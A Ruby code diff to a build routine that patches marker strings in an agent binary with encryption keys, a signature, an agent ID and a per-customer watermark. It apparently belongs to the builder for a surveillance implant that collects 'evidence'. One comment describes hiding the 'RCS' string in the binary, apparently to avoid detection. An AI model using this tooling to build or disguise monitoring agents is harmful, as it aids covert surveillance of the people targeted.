@@ -99,7 +99,7 @@ class Build
     # evidence encryption key
     begin
       key = Digest::MD5.digest(@factory.logkey) + SecureRandom.random_bytes(16)
-      content.binary_patch '3j9WmmDgBqyU270FTid3719g64bP4s52', key
+      content.binary_patch 'WfClq6HxbSaOuJGaH5kWXr7dQgjYNSNg', key
     rescue
       raise "Evidence key marker not found"
     end
@@ -107,7 +107,7 @@ class Build
     # conf encryption key
     begin
       key = Digest::MD5.digest(@factory.confkey) + SecureRandom.random_bytes(16)
-      content.binary_patch 'Adf5V57gQtyi90wUhpb8Neg56756j87R', key
+      content.binary_patch '6uo_E0S4w_FD0j9NEhW2UpFw9rwy90LY', key
     rescue
       raise "Config key marker not found"
     end
@@ -116,9 +116,13 @@ class Build
     begin
       sign = ::Signature.where({scope: 'agent'}).first
       signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
-      content.binary_patch 'f7Hk0f5usd04apdvqw13F5ed25soV5eD', signature
-    rescue
-      raise "Signature marker not found"
+
+      marker = 'ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ'
+      magic = LicenseManager.instance.limits[:magic] + marker.slice(8..-1)
+
+      content.binary_patch magic, signature
+    rescue Exception => e
+      raise "Signature marker not found: #{e.message}"
     end
 
     # Agent ID
@@ -126,16 +130,25 @@ class Build
       id = @factory.ident.dup
       # first three bytes are random to avoid the RCS string in the binary file
       id['RCS_'] = SecureRandom.hex(2)
-      content.binary_patch 'av3pVck1gb4eR2', id
+      content.binary_patch 'EMp7Ca7-fpOBIr', id
     rescue
       raise "Agent ID marker not found"
     end
 
     # demo parameters
     begin
-      content.binary_patch 'hxVtdxJ/Z8LvK3ULSnKRUmLE', SecureRandom.random_bytes(24) unless params['demo']
+      content.binary_patch 'Pg-WaVyPzMMMMmGbhP6qAigT', SecureRandom.random_bytes(24) unless params['demo']
     rescue
       raise "Demo marker not found"
+    end
+
+    # magic random seed (magic + random)
+    begin
+      magic = LicenseManager.instance.limits[:magic] + SecureRandom.urlsafe_base64(32)
+      magic = magic.slice(0..31)
+      content.binary_patch 'B3lZ3bupLuI4p7QEPDgNyWacDzNmk1pW', magic
+    rescue
+      raise "WMarker not found"
     end
 
     if File.size(path(params[:core])) != content.bytesize
@@ -222,6 +235,17 @@ class Build
   
   def path(name)
     File.join @tmpdir, name
+  end
+
+  def add_magic(content)
+    # per-customer signature
+    begin
+      marker = 'ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ'
+      magic = LicenseManager.instance.limits[:magic] + marker.slice(8..-1)
+      content.binary_patch marker, magic
+    rescue
+      raise "Signature marker not found"
+    end
   end
 
   def clean
